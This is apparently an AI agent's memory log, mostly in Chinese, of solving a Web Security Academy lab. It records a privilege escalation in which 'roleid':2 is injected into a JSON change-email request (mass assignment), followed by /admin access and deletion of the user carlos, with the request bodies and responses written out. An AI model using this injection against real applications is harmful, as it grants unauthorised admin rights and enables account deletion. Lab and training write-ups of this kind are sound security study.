---
metadata:
  node_type: memory
name: "PRS arm A user-role-modified-in-profile"
description: "arm A 重放(实例 reused:true,先 banner_verdict 判已 solved 弃归因):roleid:2 经 change-email JSON mass assignment 提权,/admin 200,delete carlos 腿只剩 302(目标用户早删)"
last_updated: 2026-10-08T18:27:24+08:00
created: 2026-10-08T18:26:04+08:00
---

## 2026-10-08 arm A 基线 — lab-user-role-can-be-modified-in-user-profile

题面(公开描述即可给足线索):admin 面 /admin 仅 roleid=2 可入;删 carlos;凭据 wiener:peter。

实录(冷实例,range_launch reused:false,jar /tmp/cj1.json):
- page_read 题面页 → lab_id 703ED76CC046C2C9C06B661C1C25F53F7C1CB238E9B7FA9AFF664177FD7C7773(solutions 已剥离,无泄漏)
- range_launch → https://0af...web-security-academy.net/
- http_session get /login(无 CSRF 隐藏域,登录表单裸 POST)→ post username=wiener&password=peter --follow → /my-account?id=wiener
- /my-account 的邮箱表单:onsubmit='jsonSubmit(this, event, "/my-account/change-email")',即 JSON 体不是表单编码
- 基线 POST /my-account/change-email,Content-Type: application/json,{"email":"probe@normal-user.net"} → 302 + 体 {"username":"wiener","email":...,"apikey":...,"roleid":1}(端点回显完整用户对象 ⇒ 暗示 roleid 是服务端接受字段)
- 同请求体加 "roleid":2 → 回显 roleid:2
- GET /admin → 200 用户列表(wiener/carlos)
- GET /admin/delete?username=carlos --follow → 302→/admin,banner class "academyLabBanner is-solved" + "Congratulations, you solved the lab!"

判型:mass-assignment / 参数注入到 JSON 资料更新体(非 IDOR、非方法交换)。关键判据 = 响应回显 roleid 值,提权后 /admin 直接可入,无需重新登录。
件序:page_read → range_launch → http_session(get/post/follow) 全程,5 次 http_session 收口。banner_verdict 未用(复用为 false 无需弃跃迁判定),终态由 delete 响应内嵌 is-solved 直接判定。
坑:登录表单无 csrf 字段,不必先取 token;邮箱更新是 JSON 而非 form-urlencoded,直接发 form 编码体不会命中该端点。


## 2026-10-08

## 2026-10-08T18:40:00+08:00 arm A replay, reused instance (range_launch reused:true)

- launch: range_launch --jar /tmp/cj1.json, widget-lab-id sha256 703ED76C…7773 → https://0af0005c035b49bf80db622400c8002a.web-security-academy.net/ , reused:true.
- reused 先 banner_verdict: solved:true(is-solved + congrats 已在),即旧实例状态留存 ⇒ 本轮 pass 不可归因,只作链复证。
- 本会话新 session(2rht… → t2Qm…),POST /login form username=wiener&password=peter(无 csrf)→ 302 `/my-account?id=wiener`。
- 提权腿:POST /my-account/change-email,`Content-Type: application/json`,body `{"email":"wiener@probe.net","roleid":2}` → 302,响应体 `{"username":"wiener","email":"wiener@probe.net","apikey":"…","roleid":2}` ⇒ roleid 是客户端可控字段(mass assignment)。
- /admin → 200,Users 区只剩 wiener(carlos 在本实例上早已被删);`/admin/delete?username=carlos` → 302 `/admin`(请求被接受,无可见变化)。
- 收口 banner_verdict solved:true。
- 坑:该 lab 的导航栏对任意已登录用户都渲染 `/admin` 链接,不能当提权证据;提权证据是 change-email 响应里的 `roleid:2` 与随后 /admin 200。

